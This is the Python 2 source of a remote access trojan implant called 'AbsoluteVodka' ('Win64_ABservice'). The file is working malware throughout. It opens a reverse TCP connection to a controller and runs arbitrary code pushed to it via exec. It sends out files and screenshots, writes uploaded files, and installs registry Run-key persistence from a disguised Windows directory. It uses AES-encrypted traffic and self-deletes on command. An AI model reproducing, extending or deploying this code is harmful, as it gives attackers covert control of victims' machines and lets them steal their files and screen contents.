# AbsoluteVodka Win64_ABservice

import base64
import platform
import socket
import os
import struct
import io
import select
import random
import string
from PIL import ImageGrab
import sys
import shutil
import hashlib
import psutil
import subprocess
from time import sleep
from Crypto import Random
from Crypto.Cipher import AES


controlled_exit = False


class EBYTES:
    def __init__(self):
        pass

    ping_byte = '.png.'
    command_handling_byte = '.cha.'
    list_session_byte = '.lst.'
    exit_byte = '.ext.'
    break_byte = '.brk.'
    host_byte = '.hst.'
    update_byte = '.upd.'
    uninstall_byte = '.uns.'
    confirm_uninstall_byte = '.cns.'
    error_byte = '.err.'
    confirmation_byte = '.cfm.'


class Persistence:
    def __init__(self):
        self.SERVICE_NAME = "Win64_ABservice"

        if getattr(sys, 'frozen', False):
            self.EXECUTABLE_PATH = sys.executable
        elif __file__:
            self.EXECUTABLE_PATH = __file__
        else:
            EXECUTABLE_PATH = ''
        self.EXECUTABLE_NAME = os.path.basename(self.EXECUTABLE_PATH)
        self.INSTALL_DIRECTORY = "C:\\WINDOWS\\ccmcache\\64" + "\\"

    def install(self):
        if not self.is_installed():
            try:
                if not os.path.exists(self.INSTALL_DIRECTORY):
                    try:
                        os.makedirs(self.INSTALL_DIRECTORY)
                    except Exception, e:
                        ReverseTCP.PrintDebug(ReverseTCP(), 'PersistenceError -> ' + str(e))
                        self.INSTALL_DIRECTORY = os.environ["TEMP"] + "\\64" + "\\"
                        os.makedirs(self.INSTALL_DIRECTORY)

                shutil.copyfile(self.EXECUTABLE_PATH, self.INSTALL_DIRECTORY + self.EXECUTABLE_NAME)

                stdin, stdout, stderr = os.popen3(
                    "reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /f /v %s /t REG_SZ /d %s" % (
                        self.SERVICE_NAME, self.INSTALL_DIRECTORY + self.EXECUTABLE_NAME))
                return True
            except Exception, e:
                return str(e)
        else:
            return True

    def is_installed(self):
        output = os.popen(
            "reg query HKCU\Software\Microsoft\Windows\Currentversion\Run /f %s" % self.SERVICE_NAME)
        if self.SERVICE_NAME in output.read():
            return True
        else:
            return False

    def clean(self):
        try:
            subprocess.Popen("reg delete HKCU\Software\Microsoft\Windows\CurrentVersion\Run /f /v %s" % self.SERVICE_NAME,
                             shell=True)
            subprocess.Popen(
                "reg add HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce /f /v %s /t REG_SZ /d %s" % (
                    self.SERVICE_NAME, "\"cmd.exe /c del %s\\" % self.EXECUTABLE_PATH + "\""),
                shell=True)
            return True
        except Exception, e:
            return str(e)


class InformationGathering:
    def __init__(self):
        pass

    @staticmethod
    def OsName():
        return platform.system() + " " + platform.release()

    @staticmethod
    def Arch():
        return platform.architecture()[0]

    @staticmethod
    def Screenshot():
        try:
            image = ImageGrab.grab()
            filename = ''.join(random.choice(string.ascii_letters) for _ in range(5))
            filename += ".jpg"
            filepath = os.path.join(os.environ['temp'], filename)
            image.save(filepath)
            return filepath
        except Exception, e:
            return 'Error: ' + str(e)


class AESCipher(object):

    def __init__(self, key):
        self.bs = 32
        self.key = hashlib.sha256(key.encode()).digest()

    def encrypt(self, raw):
        raw = self._pad(raw)
        iv = Random.new().read(AES.block_size)
        cipher = AES.new(self.key, AES.MODE_CBC, iv)
        return base64.b64encode(iv + cipher.encrypt(raw))

    def decrypt(self, enc):
        enc = base64.b64decode(enc)
        iv = enc[:AES.block_size]
        cipher = AES.new(self.key, AES.MODE_CBC, iv)
        return self._unpad(cipher.decrypt(enc[AES.block_size:])).decode('utf-8', 'ignore')

    def _pad(self, s):
        return s + (self.bs - len(s) % self.bs) * chr(self.bs - len(s) % self.bs)

    @staticmethod
    def _unpad(s):
        return s[:-ord(s[len(s)-1:])]


class ReverseTCP:
    def __init__(self):
        self.host = '127.0.0.1'
        self.port = 9876
        self.buffer = 1024 * 24
        self.spl = ':' * 5
        self.socket = None
        self.debug = True
        self.reconnectionDelay = 5  # s
        self.implantName = '0x' + 'EP01'
        self.uninstall = False
        self.autoPersistence = False
        self.key = ''

    def SetupPersistence(self):
        if self.autoPersistence:
            Persistence().install()

    @staticmethod
    def download_file(filename):
        try:
            f = open(filename, 'rb')
            content = f.read()
            return content
        except Exception, e:
            return str(e)

    def send_msg(self, msg):
        msg = AESCipher(self.key).encrypt(msg)
        msg = struct.pack('>I', len(msg)) + msg
        self.socket.sendall(msg)

    def send_msg_noenc(self, msg):
        msg = base64.b64encode(msg)
        msg = struct.pack('>I', len(msg)) + msg
        self.socket.sendall(msg)

    def recv_msg(self):
        # Read message length and unpack it into an integer
        raw_msglen = ReverseTCP.recvall(self.socket, 4)
        if not raw_msglen:
            return None
        msglen = struct.unpack('>I', raw_msglen)[0]
        # Read the message data
        return AESCipher(self.key).decrypt(ReverseTCP.recvall(self.socket, msglen))

    def recv_msg_noenc(self):
        # Read message length and unpack it into an integer
        raw_msglen = ReverseTCP.recvall(self.socket, 4)
        if not raw_msglen:
            return None
        msglen = struct.unpack('>I', raw_msglen)[0]
        # Read the message data
        return base64.b64decode(ReverseTCP.recvall(self.socket, msglen))

    @staticmethod
    def recvall(sock, n):
        # Helper function to recv n bytes or return None if EOF is hit
        data = b''
        while len(data) < n:
            packet = sock.recv(n - len(data))
            if not packet:
                return None
            data += packet
        return data

    def PrintDebug(self, string_):
        if self.debug:
            print string_

    def InitializeSocket(self):
        try:
            self.socket = socket.socket()
            self.socket.settimeout(10)
        except socket.error as e:
            self.PrintDebug('InitializeSocket [Error] -> %s' % str(e))

    def SetupEncryptedConnection(self):
        try:
            self.key = base64.b64decode(self.socket.recv(1024))
            print self.key
        except Exception, e:
            self.PrintDebug('SetupEncryptedConnection [Error] -> %s' % str(e))

    def SocketConnection(self):
        try:
            self.socket.connect((self.host, self.port))
        except socket.error as e:
            if '10056' in str(e):
                self.socket.close()
            self.PrintDebug('SocketConnection.Callback [Error] -> %s' % str(e))
            sleep(5)
            raise

        self.SetupEncryptedConnection()
        try:
            self.send_msg(
                self.implantName + self.spl + InformationGathering.OsName() + self.spl + InformationGathering.Arch())
        except socket.error as e:
            self.PrintDebug('SocketConnection.CallbackIG [Error] -> %s' % str(e))
            raise
        return

    # def link_update(self, data):
    #     try:
    #         url = data.split(':'*5)[1]
    #         myfile = requests.get(url)
    #         filename = os.environ["TEMP"] + "\\64" + "\\Win64_ABservice_Update.exe"
    #         open(filename, 'wb').write(myfile.content)
    #
    #         # TODO : Close Socket , run new file, uninstall the current implant
    #
    #     except Exception as e:
    #         self.PrintDebug('LinkUpdate [Error] -> %s' % str(e))
    #         pass

    def DataParsing(self, data):
        try:
            data = base64.b64decode(data)
            if '+' * 5 in data:
                try:
                    cmd = data.split('+' * 5)[1]
                    exec cmd
                    returnvalue = run()  # Output
                    self.send_msg(returnvalue)
                except Exception as e:
                    self.send_msg('- ' + str(e))
            elif data == "path":
                self.send_msg(os.path.realpath(__file__))
            elif data.startswith('download '):
                try:
                    filename = data.split(' ')[1]
                    if os.path.isfile(filename):
                        self.send_msg(EBYTES.exit_byte)
                        confirm = self.recv_msg()
                        if confirm == EBYTES.confirmation_byte:
                            self.send_msg_noenc(self.download_file(filename))
                    else:
                        self.send_msg(EBYTES.error_byte)
                except ValueError:
                    self.send_msg('Error: expecting filename.')
            elif data.startswith('upload '):
                try:
                    filename = data.split(' ')[1]
                    self.send_msg(EBYTES.exit_byte)
                    body = self.recv_msg_noenc()
                    if body == EBYTES.error_byte:
                        return
                    else:
                        f = open(filename, 'wb')
                        f.write(body)
                        f.close()
                        self.send_msg(EBYTES.confirmation_byte)
                except Exception, e:
                    self.send_msg(str(e))
                except ValueError:
                    self.send_msg('Error: expecting filename.')
            elif data == 'screenshot':
                filename = InformationGathering.Screenshot()
                if not 'Error:' in filename:
                    try:
                        if os.path.isfile(filename):
                            self.send_msg(EBYTES.exit_byte)
                            confirm = self.recv_msg()
                            if confirm == EBYTES.confirmation_byte:
                                self.send_msg(self.download_file(filename))
                                os.remove(filename)
                        else:
                            self.send_msg(EBYTES.error_byte)
                    except ValueError:
                        self.send_msg('- Error: expecting filename.')
                else:
                    self.send_msg(filename)
            elif data.startswith('persistence '):
                try:
                    _, argument = data.split(' ')
                    if argument == "install":
                        prss = Persistence()
                        output = prss.is_installed()
                        if output:
                            self.send_msg('* Persistence is already installed on the system.')
                        else:
                            output = prss.install()
                            if output:
                                self.send_msg('+ Persistence successfully installed.')
                            else:
                                self.send_msg('- ' + str(output))
                    elif argument == "remove":
                        prss = Persistence()
                        output = prss.is_installed()
                        if not output:
                            self.send_msg('* Persistence is already removed from the system.')
                        else:
                            output = prss.clean()
                            if output:
                                self.send_msg('+ Persistence successfully removed.')
                            else:
                                self.send_msg('- ' + str(output))
                    elif argument == "status":
                        prss = Persistence()
                        output = prss.is_installed()
                        if output:
                            self.send_msg('+ Persistence is installed on the system.')
                        else:
                            self.send_msg('- Persistence is not installed on the system.')
                except Exception, e:
                    self.send_msg(str(e))
                except ValueError:
                    self.send_msg('- Error: expecting argument.')
            elif data.startswith('cd '):
                try:
                    folder = data.split(' ')[1]
                    os.chdir(folder)
                    self.send_msg(os.getcwd())
                except Exception, e:
                    self.send_msg('- ' + str(e))
            else:
                self.send_msg('- Unrecognized command.')
        except Exception, e:
            self.send_msg('- ' + str(e))

    def CommandHandling(self):
        while True:
            try:
                data = self.recv_msg()
                if data != EBYTES.ping_byte:
                    if data == EBYTES.break_byte:
                        break
                    elif data == EBYTES.exit_byte:
                        return False
                    elif data == EBYTES.command_handling_byte:
                        self.send_msg(EBYTES.list_session_byte)
                    elif data == EBYTES.host_byte:
                        self.send_msg(self.host)
                    elif data == EBYTES.update_byte:
                        # self.link_update(data)
                        pass
                    elif data == EBYTES.uninstall_byte:
                        # Magic Byte
                        prss = Persistence()
                        prss.clean()
                        self.send_msg(EBYTES.confirm_uninstall_byte)
                        self.socket.close()
                        self.uninstall = True
                        break
                    else:
                        self.DataParsing(data)
                else:
                    self.send_msg(EBYTES.command_handling_byte)
            except socket.timeout:
                self.PrintDebug('Socket timeout.')
            except socket.error as e:
                self.PrintDebug('SocketConnection.CallbackComm [Error] -> %s' % str(e))
                return True
            except Exception, e:
                self.PrintDebug('SocketConnection.UnhandledException [Error] -> %s' % str(e))
        self.socket.close()
        return True

    def DormantHandler(self):
        while True:
            if self.uninstall:
                break
            try:
                data = self.recv_msg()
                if data == EBYTES.ping_byte:
                    self.send_msg(EBYTES.command_handling_byte)
                    if not self.CommandHandling():
                        return False
                    else:
                        return True
                elif data == EBYTES.command_handling_byte:
                    self.send_msg(EBYTES.list_session_byte)
                elif data == EBYTES.exit_byte:
                    return False
            except socket.timeout:
                continue
            except socket.error as e:
                self.PrintDebug('SocketConnection.DormantHandler [Error] -> %s' % str(e))
                return True


def ConnectionHandler(rTCPv):
    while True:
        try:
            rTCPv.SocketConnection()
        except Exception, e:
            rTCPv.PrintDebug('ConnectionHandler [Error] -> %s' % str(e))
        else:
            break


def CommandHandler(rTCPv):
    try:
        if not rTCPv.DormantHandler():
            return False
        else:
            return True
    except Exception, e:
        rTCPv.PrintDebug('CommandHandler [Error] -> %s' % str(e))
    rTCPv.socket.close()
    return False


if __name__ == '__main__':
    while True:
        rTCP = ReverseTCP()
        rTCP.SetupPersistence()
        rTCP.InitializeSocket()
        ConnectionHandler(rTCP)
        if CommandHandler(rTCP):
            continue
        else:
            break
